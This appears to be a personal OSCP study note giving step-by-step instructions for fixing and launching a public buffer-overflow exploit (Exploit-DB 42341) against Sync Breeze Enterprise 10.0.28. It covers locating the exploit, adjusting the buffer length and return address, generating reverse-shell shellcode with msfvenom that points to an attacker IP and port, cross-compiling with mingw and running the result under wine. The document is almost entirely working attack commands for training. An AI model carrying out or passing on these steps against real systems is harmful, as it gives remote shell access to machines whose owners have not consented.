---
aliases: Fixing Memory Corruption Exploits
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - memory_corruption
  - buffer_overflow
  - fix_exploits
author: Mehdi N Tehrani
creat_date: 2023-12-29
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# References
https://en.wikipedia.org/wiki/Null-terminated_string

# Exploit Steps

1. find syncbreeze exploit
#syncbreeze #syncbreeze_enterprise #sync_breeze #exploit
`searchsploit "sync breeze enterprise 10.0.28"`

2. install `mingw-w64`
`sudo apt install mingw-w64`
#kali_install

3. update `42341.c`
	- update server address
		- `server.sin_addr.s_addr`
		- `char request_one[] =`
			- `Host:`
			- `Referer:`
	- update initial buffer size:
		- `int initial_buffer_size = 781;`
		- changed from 780 to 781
	- update return address:
		- `unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83`
	- update shell code using `msfvenom`; leave `nop` slide as is
		- `msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.216 lport=7777 exitfunc=thread -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x25\x26\x2b\x3d'`

4. compile c code
	- `i686-w64-mingw32-gcc ./42341.c -o syncbreeze_exploit.exe -lws2_32`
1. run with *wine*
	- `wine syncbreeze_exploit.exe`

